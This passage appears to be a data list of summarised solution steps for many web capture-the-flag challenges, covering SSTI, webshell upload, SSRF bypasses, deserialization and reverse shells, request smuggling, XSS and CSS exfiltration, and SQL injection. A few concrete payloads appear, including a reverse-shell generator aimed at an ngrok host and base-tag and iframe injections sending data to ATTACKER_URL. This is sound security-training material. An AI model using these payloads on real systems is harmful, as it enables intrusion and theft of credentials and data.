    "Launched the attack script on the new GitHub Pages site and observed the attack working even with Chrome's cache partitioning policy",
    "Identified the '.git' directory and source code were exposed on the webserver",
    "Found that in 'app.py', the flag is exposed",
    "Identified a vulnerability in the 'new chat' feature",
    "Observed that when sending an SMS to a number that does not begin with '+1337' or '1337', the 'send_sms' function in 'sms.py' is invoked",
    "Identified that Flask's 'render_template_string' function is used to generate the SMS message in 'send_sms' function",
    "Realized that the resulting template is user-controllable, as 'login' is the username",
    "Recognized the potential for Server-Side Template Injection (SSTI), due to the 'add_money_to_login' function added to the template context",
    "Created two accounts, with one of the usernames being '{{ add_money_to_login(USERNAME, AMOUNT_OF_MONEY) }}'",
    "Used an SMS message to invoke the call to the 'render_template_string' function and in turn, the 'add_money_to_login' function",
    "Generated sufficient money in one of the user accounts through this method",
    "Used the acquired financial resources to buy the flag.",
    "Identified a user profile with list of created books hosted on the server",
    "Understood each book's URL structure on server as /books/USER_ID/FILENAME",
    "Discovered the server was powered by PHP",
    "Noticed that files with commonly used extensions are downloaded, while .html files are rendered inline",
    "Attempted to upload a .php file to run arbitrary PHP code",
    "Realized that .php extensions were being recursively filtered",
    "Tested different file extensions and found .phtml extension, which also executes PHP code, was not being filtered",
    "Uploaded a PHP webshell with a .phtml extension",
    "Navigated to the uploaded webshell and ran the command cat /flag.txt",
    "Acquired the flag YauzaCTF{PHP_minecraft_h4ck3r} by executing the command",
    "Given the /request endpoint from challenge.",
    "Identified behavior: if the host is not found or the URL is invalid, a specific message is returned.",
    "Identified behavior: if SSRF is detected, a specific message is returned. Blacklist works based on 'localhost' and '127'.",
    "Understood that the server uses Python's requests library to issue GET requests to the submitted URL and returns response headers.",
    "Found a way to bypass the localhost blacklist by using an alternative representation of '127.0.0.1', like '0177.0.0.1'.",
    "Bypassed filter and performed an internal port scan for ports between 5000 and 10000.",
    "Found out that ports 8080 and 9006 were open.",
    "Identified content lengths as indicators of page existence due to uniform content length of Not Found (404) pages.",
    "Identified that the page at port 8080 is the same as the public challenge site.",
    "Tried to access port 9006 directly but didn't get meaningful information.",
    "Used a redirection through a PHP server, which revealed the flag in one of the headers.",
    "Given an endpoint that allows sending feedback in form of HTML. Initial attempts to supply URLs were futile.",
    "Discovered that arbitrary HTML submitted is rendered by the admin's browser. Verified this by submitting HTML enclosed in script tags to catch the HTTP request.",
    "Introduced three separate payloads in the HTML to obtain more information on the browsing context: one to get the full URL of the browsing context, another to get the page contents, and the third to get readable cookies.",
    "Extracted the page URL and learned that our submitted HTML was the only content present on the page. Also found that JavaScript couldn't read any cookies from the output of the payloads.",
    "Used the discovered page URL (`http://0.0.0.0/Secret_admin_cookie_panel`), received a `Set-Cookie` header from this page for a new cookie with HttpOnly flag set.",
    "Identified a `/flag` endpoint that had been inaccessible due to lack of the appropriate cookie.",
    "Revisited the page with the newly acquired 'admin' cookie, which allowed access to the `/flag` endpoint and revealed the flag.",
    "Inspect the given source code and identify the '/guest' endpoint which deserializes the base 64 decoded 'guest' cookie",
    "Recognize there's a well-known deserialization vulnerability in node.js that could lead to Remote Code Execution (RCE)",
    "Understand by passing a serialized object into 'serialize.unserialize()', RCE can be achieved through a JavaScript Immediately Invoked Function Expression (IIFE)",
    "Plan to execute a reverse shell payload within the function that would be fired when the data is deserialized",
    "Use 'nodejsshell.py' to craft such a payload, with the command 'python nodejsshell.py 2.tcp.ngrok.io 13755' to generate a reverse shell payload for the ngrok tunnel",
    "Copy the output into the function body",
    "Test your payload to make sure it works",
    "Encode the payload to base 64",
    "Send the encoded payload through the cookie header",
    "Establish a reverse shell which lets you read the flag",
    "Checked source code and identified the prototype pollution vulnerability",
    "Understood that 'JSON.parse' allows the '__proto__' key, storing it as ['__proto__']",
    "Identified how to leverage the prototype pollution to run 'require('./usage')'",
    "Noticed that causing a TypeError triggers the 'require('./usage')'",
    "Interpreted how 'pkg' and 'pkgPath' can be controlled by polluting '__proto__.data' and '__proto__.path'",
    "Found out that 'pkg' is an object containing the 'package.json' fields and 'pkgPath' is the path to this package",
    "Found that we can load any JavaScript file by polluting 'data' and 'exports' in '__proto__.data' and '__proto__.path'",
    "Found '/opt/yarn-v1.22.19/preinstall.js' in the container",
    "Identified that 'child_process.execFileSync' is being called in 'preinstall.js'",
    "Understood that to reach this code path, 'npm_config_global' needs to be polluted to a truthy value",
    "Realized that 'process.env.npm_execpath' can be controlled since it is not set by default",
    "Figured out how to use '--eval' option to run inline JavaScript",
    "Realized JSON payload cannot have spaces due to regex match and used '${IFS}' to get around this",
    "Defined final payload using 'wget' and command substitution to exfiltrate the '/readflag' output",
    "Sent payload and received flag on the HTTP server",
    "Visiting the webpage and analyzing the response headers to guess that the server was using FastAPI",
    "Downloading the `openapi.json` to look for available endpoints",
    "Understanding the functionality of the `/new` endpoint from the downloaded json",
    "Investigating the requirements and specifications of an uploaded zip file which should contain a `run` bash script",
    "Creating and uploading a zip file with a `run` bash script that gives a reverse shell",
    "Reading the first flag with the `nobody` user permissions",
    "At this point, using the gained reverse shell to view the source code of the program",
    "Discovering that if a zip file with 'docker-entry' in its name is uploaded, the program will execute the script within a docker container with greater access (runs as `uploaded` user) as opposed to executing normally (runs as `nobody` user)",
    "Understanding that gaining a shell inside the docker container could provide more privileges",
    "Writing, compiling and giving SUID and SGID permissions to a binary that sets the effective user and group IDs to that of the SUID and SGID permissions",
    "Running this binary inside the docker container to increase the privileges, and subsequently reading the second flag",
    "Identify that the challenge consists of 3 services - Traefik (a HTTP proxy), a Python microservice, and a Go microservice",
    "Observe the configuration file of the Traefik service, note that it acts as a reverse proxy for the Go microservice, and only accepts the POST, GET, OPTIONS, DELETE and PATCH methods",
    "Examine the Go microservice and note that it uses the Beego web framework, acting as a reverse proxy for the Python microservice when the PUT method is used",
    "Evaluate the Python microservice, note that it allows the running of arbitrary commands when the GET method is used",
    "Realize the challenge of reaching the Python microservice that only accepts the PUT method while the Traefik proxy only allows the POST, GET, OPTIONS, DELETE and PATCH methods",
    "Inspect the Beego source code to find a way of issuing a pseudo PUT request by using a POST request with a '_method' query parameter set to PUT",
    "Make a request to the Go microservice using a POST method with a '_method=PUT' query to reach the 'Put()' handler",
    "Identify that the Python microservice runs on Flask's built-in server which, by its insecure nature can be susceptible to HTTP request smuggling attacks",
    "Navigate the HTTP request smuggling attack by noting that the Flask server treats underscores ('_') as hyphens ('-') and allows duplicate 'Content-Length' headers",
    "Setup a request, with differing 'Content-Length' header values, taking advantage of the Flask server's failure to comply with RFC norms",
    "Cause a GET request to the Python microservice to be executed by smuggling it inside a POST request made to the Go microservice, using HTTP request smuggling",
    "Get a reverse shell on the Python microservice to obtain the flag",
    "Read the given challenge which involves investigating an unintentionally exposed internal API and finding a flag",
    "Go through the provided source code of the backend",
    "Spot an interesting behavior with 'RegExp.prototype.test()' used with regex containing the global flag. This trick helps continue the search from the previously found index onwards and it can allow multiple instances of 'fqdn'",
    "Find a way around the restrictive regex check by submitting same payload multiple times",
    "Convince the server to communicate with arbitrary URL by bypassing regex using the provided loophole",
    "Understand that the 'Buffer' needs to be 16 bytes, meaning you need at least 32 characters in your 'fqdn'",
    "Leverage that 'Buffer' stops when it encounters the first non-hexadecimal character",
    "Derive a URL that starts with 32 bytes of hexadecimal characters using leading 0's and convert your public IP address to octal form using an octal IP address converter",
    "Ensure the trailing '.ping-proxy/ping' turns into a URL fragment by appending '#' at the end of the 'fqdn', which simply makes the final URL your public IP address",
    "Receive the request and observe the flag in the request header",
    "Claim the flag to complete the challenge",
    "Load the CTF challenge and look into the provided source code to understand how the application works",
    "Notice that the application is a 'screenshotter' service that allows users to enter arbitrary URLs to be rendered by a Chromium instance",
    "Observe that the service doesn't allow for file:// protocol as it validates the URL to be HTTP(S)",
    "Read the function getBrowserWithTimeout and note that a remote debugging port is exposed which normally allows commands to be sent to the browser through the DevTools protocol",
    "Consider that the debugging port is randomized from the getRandomPort function",
    "Formulate a strategy to leak the debugging port, understanding that the port scan needs to be completed within 30 seconds before the browser instance is closed",
    "Code a web page that uses a Promise to try and load a URL, if the URL loads, the port is open and the script logs it and attempts to send this information to a remote server set up for this purpose",
    "Deploy this page on a server and point the 'screenshotter' service to it, allowing you to detect open debugging ports",
    "Create the server script to receive the port number from the exfiltration attempt, writing the port number used to a file to keep track",
    "Request Chromium to open a new webpage, targeting the URL file:///tmp/flag.txt with the port number obtained causing the flag to be displayed in the browser instance",
    "Fetch the screenshotter service and put the result in an iframe to display in the screenshotting service",
    "Take the screenshot of the flag and convert the image to text using OCR (Optical Character Recognition) to extract the flag",
    "Build a second-stage exploit that creates a WebSocket connection to the DevTools of the browser instance and sends JavaScript code to the browser instance using the Runtime.evaluate method",
    "The JavaScript sends a POST request to the remote server, exfiltrating the contents of the 'flag' file",
    "Visit the URL http://asuna.nullsession.pw.",
    "Observe HTTP response and try using /search as per instructions in response.",
    "Test with some classic SQL Injection payloads.",
    "Receive 403 Forbidden, page indicating SQL Injection attacks are blocked.",
    "Notice the 'Server' header in HTTP response - application is behind AWS ELB and likely AWS WAF.",
    "Review AWS WAF documentation, particularly for rules blocking longer payloads.",
    "Test a trivial payload with a length over 8kB and confirm it is not blocked.",
    "Write an SQLMap tamper script to prepend 'a' characters to the payload to exceed 8kB.",
    "Use the tamper script with SQLMap to dump the database.",
    "Find flag in the database dump: 'CTFSG{A_Cru3l_Summ3r_W1th_SAO_RELEASE_RECOLLECTION}'.",
    "Review AWS managed rules changelog and corresponding documentation for mitigation strategies.",
    "The challenge involves a proxy server and a backend server accessible at provided URLs",
    "Inspecting the proxy reveals that it makes a request to the backend with a 'secret' token added to cookies",
    "A user-controlled 'uri' is appended to the backend URL with Python's urllib.parse.urljoin",
    "Realization that urllib.parse.urljoin doesn't handle malformed paths correctly - it can return the appended path as the base URL",
    "Using this anomaly, form a request to the proxy with the 'uri' parameter having a malformed path such as //ATTACKER-URL, causing the proxy to send a request to the specified URL",
    "The received request from the proxy contains the 'secret' cookie value",
    "By knowing the secret, now able to send a request directly to the backend server",
    "The backend checks for the 'secret' cookie before returning the flag",
    "The flag 'CTFSG{d0nT_toUcH_mY_c00k13s}' is obtained",
    "Identified the end goal, i.e., is to get access to /flag. The JWT token has a role attribute that needs to be changed to admin before you can proceed.",
    "The registration and login process was then studied. The JWT key was created for each new user during the registration process. This JWT key was used to sign the token when the user logs in.",
    "Identified that there is a caching mechanism where each user's JWT key is stored in a Redis cache after logging in. Noticed that the key is only stored for 2 seconds.",
    "Explored the non-admin path, /sakura that allows interaction with the Redis cache. But the process only permits requests from a client URL validated to be 127.0.0.1.",
    "Identified /rin that uses SSRF code. The server checks the X-Forwarded-For header to validate the client IP.",
    "Realized that by adding X-Forwarded-For: 127.0.0.1, an SSRF is possible to the /sakura endpoint. As the cached secret is only available for 2 seconds after logging in, the SSRF request must be made immediately after login.",
    "Used the JWT secret to create a JWT with the admin role using https://jwt.io/ or a JWT-signing library.",
    "By using the new admin JWT token, made a request to /flag to get the flag.",
    "Registered a new account on the provided URL",
    "Checked how the OTP verification is performed by analyzing the provided source code",
    "Couldn't find any flaws in the OTP verification logic hence proceeded to find vulnerabilities in other functions",
    "Checked search function for potential vulnerabilities",
    "Identified potential SQL Injection vulnerability in the search function's MySQL query builder through string manipulation",
    "Noted that certain characters and strings were restricted like space, 'AND', 'OR', etc.",
    "Bypassed the SQL Injection protection through MySQL comments that are treated like spaces",
    "Crafted payload '/search?q=socengexp'/**/AANDND/**/(SUBSTR(otp,<POSITION>,1))='<GUESS>' to brute force the OTP character by character",
    "Used the obtained OTP to verify and login into the system",
    "Gained access to '/cornelia' URL which performs GET request on chosen URL",
    "Identified Server Side Request Forgery (SSRF) vulnerability in '/cornelia'",
    "Realized SSRF couldn't be exploited directly due to validation that prevents from specifying 'localhost' or '127.0.0.1'",
    "Leveraged the fact that the server follows redirects and used PHP to redirect to 'localhost:8081/flag' to access the flag",
    "Retrieved the flag 'CTFSG{All_T00_W3ll_T3n_M1nutes_V3rs1on_Taylors_Version}'",
    "Access the challenge URL: http://chals.ctf.sg:40401",
    "Examine the source code of the PHP page",
    "Identify the PHP script that checks if md5 hashes of 'i1' and 'i2' are equal",
    "Understand the loose comparison between two md5 hashes by the '==' operator in PHP",
    "Discover that if the string starts with '0e...', PHP treats it as a float with value 0.0",
    "Run PHP commands to verify the treatment of '0e...' strings as 0.0 in PHP",
    "Recognize that there are so-called 'magic hashes' that PHP would consider equal",
    "Refer to a list of strings that result in these magic hashes for PHP",
    "Choose two strings from the magic hash list that have a length of 15 or more",
    "Send a GET request to the page with the chosen strings as values for 'i1' and 'i2'",
    "The server responds with the flag value: 'CTFSG{you_see_me_in_h1nds1ght_tangled_up_with_you_all_night}'",
    "Analysed the `main.dart.js`, which is the Flutter app compiled by `dart2js`.",
    "Discovered an `AdminPage` and a `/api/flag` endpoint that is fetched using `postRequestWithCookies`.",
    "Identified a `/api/token` endpoint in `LoginPage` which returns the current authentication token.",
    "Examined features of the application noticing parameters in the WebSocket message that could be modified to allow callback to our server.",
    "Attempted XSS payloads, realized that rendering unescaped HTML was hopeless due to the app being rendered on a `<canvas>`.",
    "Manipulated the `widget` parameter to cause a traceback.",
    "Used `Access-Control-Allow-Origin: *` header to avoid CORS issues.",
    "Identified the remote Flutter widget file signature.",
    "Decoded the `chatmessage` widget using Remote Flutter Widgets package.",
    "Tried to manipulate the `clipboard_getData` function found in `main.dart.js`.",
    "Took a closer look at `poll.dart` which had a Mechanism `ApiMapper` that makes a GET request to the specified `apiGet` URL.",
    "Found a mechanism to fetch the poll options and exfiltrate them to `example.com` in the button `onPressed` event handler `api_post`.",
    "Modify the `ApiMapper` to fetch the admins token on GET request to the specified `apiGet` URL.",
    "Used the `onLoaded` event handler to trigger the `api_post` event for zero-click exfiltration.",
    "Got the admin's token.",
    "Fetched the flag from the `/api/flag` endpoint.",
    "Accessed the webpage which has an interface to a router with a ping functionality.",
    "Identified an end-point '/ping?id=' returning base64-encoded result of each ping request.",
    "Discovered that using a sufficiently large 'id' can cause an out-of-bound memory read.",
    "Enumerated the 'id' and found that the range between IDs '18446744073709551463' to '18446744073709551615' correspond to the router's RAM, hence the RAM can be dumped this way.",
    "Executed a Python script that sends GET requests with incrementing 'id', retrieves data, decodes the base64, and appends the result to a file.",
    "Performed a string search on the 'out.bin' file and found a potential flag.",
    "Guessed that the flag is 'FLAG{r0uter_p0rtals_are_ultimately_impenetrable_because_they_are_real_weird}'.",
    "Reviewed the site's JavaScript and understood that the 'demo()' function is called on the 'demo' GET request parameter. This results in the setting of the innerHTML of the 'result' element.",
    "Discovered that the 'mock()' function is a wrapper function that runs the function exposed by the WASM module.",
    "Identified that the WASM module uses the 'str.length' to validate the buffer, which can be less than the number of characters written into it due to inconsistencies in length measurement of Unicode characters.",
    "Found that when converting to upper case, the Unicode character 'ß' turns into two characters 'SS'. This allows us to bypass the JavaScript's check of rejecting any character with charCode greater than 128.",
    "Developed the XSS payload using <img src='x' onerror='PAYLOAD'> by using the fact that JavaScript is a case-sensitive language, and our payload is converted to uppercase before being written to the innerHTML.",
    "Created a final payload by modifying the initial JavaScript payload and replacing the string 'alert(1)' with the converted string of our JavaScript payload that fetches localStorage.getItem('flag') and sends it to the attacker's URL.",
    "Ran the Python script to generate a URL-encoded string that can be placed in the URL parameter 'demo', which will execute our malicious JavaScript code when the page loads.",
    "Analyzing the provided Javascript and Dockerfile scripts.",
    "Noticing the main class, Database, which creates, retrieves and generates tokens for notes.",
    "Identifying that process.env.FLAG in db.createNote({ data: process.env.FLAG }) is storing the flag.",
    "Discovering a programming error where crypto.randomUUID (the function) is used as the secret, instead of calling it.",
    "Understanding that the secret is not 'secret-[random UUID]' as expected, but it is the string: 'secret-function randomUUID(options) { if (options !== undefined) validateObject(options, 'options'); const { disableEntropyCache = false, } = options || {}; validateBoolean(disableEntropyCache, 'options.disableEntropyCache'); return disableEntropyCache ? getUnbufferedUUID() : getBufferedUUID(); }'.",
    "Exploiting the fact that the token for id=0 is the same every time.",
    "Using the method 'db.generateToken(0)' to generate the token.",
    "Submitting the generated token to retrieve the flag.",
    "Study and understand the given client-side web exploitation challenge, where a URL is submitted to an '/share' endpoint which is then visited by an admin bot",
    "Identify the '/queue' WebSocket endpoint where the flag resides, with the conditions that the WebSocket client's origin must start with 'http://localhost' and the client having the correct 'auth' cookie set",
    "Understand that the correct 'auth' cookie is set at the '/auth' endpoint when the request is made locally by the admin bot",
    "Perform a GET-based CSRF through a top-level navigation to set the authentication cookie for the victim using JavaScript, followed by a 'sleep' for 1 second to ensure the navigation completion and cookie placement",
    "Understand that the WebSockets library used, flask_sockets is quite old, with no vulnerability in the ws.origin",
    "Notice that ws.origin corresponds to the Origin request header, which is forbidden to be modified by JavaScript with comprises of the webpage URL, i.e., ://hostname:port",
    "Realize that there is no way around the exploit page's origin needing to start with 'http://localhost', unless a browser's zero-day allows a malicious webpage to spoof Origin headers",
    "Manipulate the fact that sufficient validation does not ensure WebSocket connection came from a page hosted on localhost, hence domain starting with localhost could be used, such as localhost.zeyu2001.com",
    "Identify that CSRF token is not being checked and WebSockets are not restricted by the Same-Origin Policy, hence enabling 'cross-site WebSocket hijacking' to obtain and exfiltrate the flag",
    "Construct a page hosted on a domain starting with 'localhost' and submitted to '/share', this script sets the auth token by making the bot visit 'http://localhost:7070/auth', opens a WebSocket to 'ws://localhost:7070/quote' and exfiltrates the data to 'http://ATTACKER_URL'",
    "Analysed PHP code and identified it will execute 'cat' command when specified in the GET request parameter 'f'.",
    "Understood that a regex filter restricts characters that can be included in the 'f' parameter.",
    "Listed out permitted characters to craft an effective attack payload.",
    "Bypassed character filter using wildcard '?' to match any single character in command arguments.",
    "Used wildcard '?' to access '/etc/hosts' file.",
    "Read an interesting binary '/readflag' using 'cat' command.",
    "Downloaded and decompiled the found binary.",
    "In the decompiled code, identified a string 'sRPd45w_0' which is a rearrangement of 'P4s5_w0Rd'.",
    "Understood that pipe character '|' is allowed, thus utilizing it to terminate the 'cat' command and run new command.",
    "Used character substitution '$()' to get the required strings for password.",
    "Executed '/usr/bin/strings /readflag' to read strings from the binary without actually running it.",
    "Filtered output to get only the relevant 'P4s5_w0Rd' string using '/etc/alternatives/nawk'.",
    "Constructed a regex pattern to extract only the string 'P4s5_w0Rd'.",
    "Passed the obtained string as an argument to '/readflag' using character substitution, which resulted in 'Wrong Password!' message.",
    "Identified the need to rearrange 'P4s5_w0Rd' into 'sRPd45w_0' to get the correct password.",
    "Developed a script which aims to index the characters in 'P4s5_w0Rd' string and reconstructs it into 'sRPd45w_0'.",
    "Ran the script and yielded the payload to rearrange password.",
    "Appended the obtained payload to '/readflag' command in the 'f' GET parameter to finally get the flag 'grey{r35p3c7_70_b45h_m4573r_0dd14e9bc3172d16}'.",
    "Identified the possibility of XSS in a user's profile.",
    "Found potential injection points in the feature allowing us to edit our bio in Markdown.",
    "Saw that the Markdown was parsed using 'marked' and 'DOMPurify'.",
    "Checked the version numbers of these libraries and searched for security vulnerabilities without any results.",
    "Ruled out mutation XSS attacks on these libraries as 'marked' does not sanitize output HTML.",
    "Looked more into Jinja2 and found the 'safe' filter that renders unescaped HTML.",
    "Identified the HTML injection vector via 'profile.html' template.",
    "Realized a '<script>' payload wouldn't work due to Content Security Policy blocking arbitrary scripts without a randomly-generated nonce.",
    "Leveraged the '<base>' HTML tag to set the base URL for all relative URLs in the document, helping bypass the Content Security Policy.",
    "Intended to load the '/static/js/marked.min.js' files from a different URL to exploit the script tags being part of the original template.",
    "Started a HTTP server, created the '/static/js' directory structure, and placed XSS payload in 'marked.min.js'.",
    "Injected '<base href=\"http://HOST:PORT\">' into the profile via 'user['title']' or 'user['lab']'.",
    "Identified the challenge as involving wkhtmltopdf, a tool that translates HTML content into a PDF.",
    "Understood that the input had to satisfy certain constraints, chiefly that 'name' could only contain alphanumeric characters, and 'email' had to pass RFC5322 validation.",
    "Used knowledge of these constraints to aim exploitation efforts at the more forgiving 'email' parameter.",
    "Examined the documentation for RFC5322 to understand what characters are allowed in the email parameter.",
    "Discovered that it allows for a domain-literal format, which permits just about any printable ASCII character.",
    "Crafted a URL that appended an HTML header tag to the domain part of the email parameter, thereby exploiting the lax character restriction.",
    "Found the server endpoint was also vulnerable to Server-Side Template Injection (SSTI).",
    "Tested the SSTI vulnerability by crafting a URL that performed simple arithmetic in the email parameter using Jinja2 template syntax.",
    "Further exploited the SSTI vulnerability by crafting a URL that would read the contents of a 'flag.txt' file on the server using built-in Python functions within the Jinja2 template.",
    "Analyze the given Python script and identify its structure and functionality",
    "Identify the version of SQL Alchemy being used via the requirements.txt file",
    "Learn that an older version of SQLAlchemy is being used and recognize its vulnerability to an SQL injection attack",
    "Observe that exploiting the vulnerability will be challenging due to its location after the ORDER BY clause",
    "Discover an article by PortSwigger about using the CASE clause to determine the column of the result being sorted.",
    "Learn that the SQLite code that can be injected into the vulnerable order_by() function",
    "Identify that the payload checks for the 6th character of the flag in the SQL database. If it matches 5, it sets the LIMIT to 1, otherwise it sets the LIMIT to 2",
    "Create a Python script that iterates over a specified alphabet to test characters against the SQL injection",
    "Launch multiple HTTP POST requests containing the SQL injection payload to experiment with different values.",
    "Check the 'Content-length' response header in each request to identify if the chosen character is correct",
    "If the script gets to a point where no character in the alphabet is causing a change in content length, break the script.",
    "Explored the website functionality and discovered an image rendering feature that places text onto a T-shirt image",
    "Conducted fuzzing to discover that HTML injection is possible",
    "Tried to load an external resource (JavaScript or stylesheet) to observe any unusual behavior",
    "Identified that the user agent is `wkhtmltoimage` through the request captured",
    "Recognized a potential SSRF vulnerability associated with `wkhtmltoimage` from previous knowledge and references",
    "Crafted an HTML payload for exploiting this vulnerability; the task of this payload is to exfiltrate the content from `http://localhost:5000/admin`",
    "Hosted the payload on an external website",
    "Triggered the payload through an iframe by entering that into the webpage's input field, with the URL in the format `http://challenge.nahamcon.com:32132/exploit?text=%3Ciframe%20src=%22https://ATTACKER_URL/exploit.html%22%3E&color=%2324d600`",
    "The payload executed successfully and leaked the contents of the admin page",
    "Searched the leaked contents of the admin page to find the flag",
    "Identified XSS vulnerability in the feedback feature of the site enabling CSRF attacks on the admin",
    "Used the XSS vulnerability to send a POST request to '/reset2fa' aiming to reset the admin's 2FA code",
    "Included 'credentials: include' to ensure same-origin policy wouldn't block the request",
    "Upon promise resolution, used 'fetch' function to send the response text (containing the new 2FA token) to an external URL",
    "Decoded the 2FA token received from previous step to obtain admin 2FA code",
    "Used the 2FA token on an authenticator application to generate the admin 2FA codes",
    "Used the generated 2FA code to perform another CSRF attack on the admin",
    "Sent a POST request to '/show_secret' (using the stolen 2FA codes) with the aim of stealing the admin's secrets",
    "Included 'Content-Type: application/json' in the request header and 'otp' and 'secretId' in the request body",
    "Upon promise resolution, used 'fetch' function to send the response text (containing the secrets) to an external URL",
    "Decoded the flag from the base64-encoded string received from previous step",
    "Analyzed the JavaScript source provided in the challenge.",
    "Identified the use of a message event handler that had to be exploited in tandem with a '.jsapi.tech' subdomain takeover.",
    "Recognized the ability to 'preview' HTML without saving it in this challenge. The HTML input however is sanitized through DOMPurify.",
    "Identified a loophole where the 'search' feature originally using 'this.noteData' could be bypassed since 'this.noteData' remained the same even after sanitizing HTML input via 'preview' feature.",
    "Ran into an issue with the 'search' feature checking for 'window.enable_experimental_features', which did not originally exist.",
    "Used DOM clobbering as DOMPurify doesn't protect against it to override 'window.enable_experimental_features' property.",
    "Inserted HTML through 'preview' feature to demonstrate DOM clobbering, thereby enabling 'enable_experimental_features'.",
    "Unintended solution used the property 'Lazy-loading' of an image to check if an extra div is rendered when search is correct.",
    "If no request is received for a particular character, it is concluded the extra div was rendered and search was a correct guess.",
    "A script was written to implement the attack involving 'Lazy-loading' property.",
    "A different intended solution involved the use of 'PerformanceLongTaskTiming API' to identify if the search was taking more than 50ms.",
    "Learned that any timing attack with 'performance.now()' would had worked too due to the JavaScript event loop being single-threaded.",
    "A script using 'setTimeout' function was written to execute the timing attack.",
    "The challenge was to host 'https://chall1.jsapi.tech' on GitHub. This site provided an HTML interface for writing and saving notes.",
    "Upon examination of the site's JavaScript script 'script.js', it was found that it added the message event handler to the window after meeting several checks.",
    "These checks included whether the 'enableapi' query parameter was set to 'true', if 'recv' query parameter was a subdomain of 'jsapi.tech', and if the window was framed or opened by another window.",
    "It was discovered that if the subdomain is 'jsapi.tech', it points to 'sohomdatta1.github.io' thanks to a wildcard DNS configuration.",
    "By using the 'dig' command on 'asdf.jsapi.tech', it was confirmed that any new repository with a CNAME file containing 'asdf.jsapi.tech' can be created to serve a GitHub pages site at 'asdf.jsapi.tech'.",
    "Further scrutiny of the code revealed that when a note is saved and self.set() is called, the note's contents are added to the 'data-last' attribute of the '#note-text-area' element. The DOMPurify v2.3.0 tool is used for sanitizing the note, with 'link' and 'style' tags explicitly permitted.",
    "This allows the addition of DOMPurify-sanitized HTML into the child iframe if a postMessage starting with 'NOTE_APP_SET_REQUEST' is sent.",
    "The site's Content-Security-Policy (CSP) allowed stylesheets to be loaded from '*.jsapi.tech', enabling the loading of a CSS file from the exploit domain.",
    "However, adding anything _before_ the '<link>' tag fixes this behaviour, such as using 'asdf<link rel='stylesheet' href='...'>'.",
    "The 'data-last' attribute of the '#note-text-area' element, containing the victim's saved note, can be exfiltrated using CSS attribute selectors.",
    "The URL specified in the 'background' of the appropriate CSS rule is only fetched if the 'data-last' attribute starts with the correct string.",
    "This then allows the flag to be brute-forced by guessing all possible characters in each position of the flag, each character having a background URL corresponding to the guessed flag.",
    "For the attack, a Python script is used to generate the corresponding CSS, and the result is saved in 'exploit.css'.",
    "The exploit page loads the challenge page as an 'iframe', waits for the API to be loaded, and then sends a 'postMessage' linking the generated CSS to the target page. This is added to a GitHub repository together with the CSS and deployed to GitHub pages under a '.jsapi.tech' subdomain.",
    "Each character was exfiltrated by redeploying the exploit GitHub page with the updated CSS.",
    "Identified that it was a Jinja2 Template Injection challenge",
    "Understood the extensive filter used for the challenge",
    "Worked on bypassing '{{' and '}}' by using an if-else statement",
    "Found a workaround for using '.' by employing the 'attr' filter",
    "Utilized 'first' and 'last' to get the first and last items of a list; Converted items in a dictionary to a list using 'list'",
    "Bypassed '_', '\\', 'class', 'subclasses', 'getitem' by constructing a string",
    "Used 'request.args' to bypass banned characters",
    "Leveraged 'lower' filter to bypass 'class', 'subclasses', and 'getitem' strings",
    "Joined the 'class' string with preceding and ending '__' characters using 'join' filter",
    "Built Remote Code Execution (RCE) payload using '().__class__.__subclasses__.__getitem__(x)' method, with 'x' corresponding to the index of 'subprocess.Popen'",
    "Bruteforced the value of 'x' by submitting RCE payload with different 'x' values until a shell was received",
    "Used similar approach to bypass '.' character for callback domain and '\"' character for bash command",
    "Created final payload using all the methods of bypassing and injecting discovered",
    "Submitted the final payload to complete the challenge",
    "Identified HAProxy configuration protecting the '/flag' endpoint as case sensitive",
    "Requested '/FLAG' endpoint instead of '/flag' to bypass the validation and obtained the flag",
    "Realized an intended solution involved exploiting a HTTP request smuggling vulnerability in HAProxy version 2.4.0",
    "Executed a POST request with an overflowing 'Content-Length' header and a second 'Content-Length' header with a value of 26",
    "Included 'GET /flag HTTP/1.1' and a dummy value as the request body which fooled HAProxy into treating it as part of the first request.",
    "A second dummy 'GET / HTTP/1.1' request was placed after which was treated as a separate request by HAProxy",
    "The requests after reaching the backend server were modified such that the first request had 'Content-Length: 0' and the second request was 'GET /flag HTTP/1.1' as intended initially",
    "The response for the second consequent request corresponded to '/flag' instead of '/' due to the request smuggling",
    "Incorporated delays between consecutive requests to account for pipelining in the server",
    "Sent the specially constructed requests to the server and obtained the flag in the response of the smuggled request.",
    "Analyze target website",
    "Find HTML injection through the 'src=' parameter",
    "Analyze Content-Security-Policy",
    "Notice 'nonce' permitting a script src='assets/js/bootstrap.js'",
    "Use '<base>' tag to rebase the URL to attacker-controlled site",
    "Craft attack URL '?src=/img/saturn.jpg'><base href=\"http://ATTACKER_URL\">'",
    "On attacker-controlled site, host custom script as 'assets/js/bootstrap.js'",
    "Script creates an 'img' element with src set to contain document.cookie",
    "Script appends 'img' element to the document body",
    "Browser fetches '/' with the cookie value appended",
    "Server logs received requests, capturing the admin's cookie",
    "Identify web application that allows file uploads and conversions",
    "Consider potential SSRF/file inclusion vectors",
    "Attempt file upload with specific HTML content to check for callbacks from server",
    "Identify LibreOffice as the tool being used for document conversions on the server",
    "Research potential vulnerabilities of LibreOffice tool",
    "Prepare a LibreOffice word document named 'poc.odt'",
    "Unzip 'poc.odt' to access 'content.xml'",
    "Modify 'content.xml' to include payload which links to the '/flag' file",
    "Zip the files into 'modified.odt' to prepare the payload",
    "Upload the 'modified.odt' file containing the payload to the server",
    "First step: Analyzed the challenge website where notes could be created and searched.",
    "Second step: Investigated the search function which uses a 302 server-side redirect to '/view' if a note matching the query is found.",
    "Third step: Discovered that an oracle could be used to determine whether the flag obtained is correct.",
    "Fourth step: Confirmed that the SameSite attribute of the cookies is set to None.",
    "Fifth step: Researched the Fetch API's limit of 20 redirects before a network error is returned.",
    "Sixth step: Identified an exploit: if a 302 redirect is detected this indicates that the flag leaks due to the network error from exceeding the Fetch API redirect limit.",
    "Seventh step: Created an attacker server to make 19 redirects.",
    "Eighth step: Made the attacker server redirect to the target URL after 19 redirects.",
    "Nineth step: Utilized script to make the client request to exploit the limit of 20 redirects using Fetch API.",
    "Tenth step: Created a PHP script to redirect to itself 19 times, before redirecting to the target URL.",
    "Eleventh step: Tested this method to successfully bruteforce the flag letter by letter.",
    "Identified that the input was being reflected into an XSL document",
    "Tested rendering in the browser and found an error was thrown",
    "Identified the Content-Type as 'text/xsl', indicating potential for Cross-Site Scripting",
    "Investigated methods for exploiting XSS attacks accessing XSL document",
    "Constructed a payload which utilises 'x:script' to exploit the vulnerability",
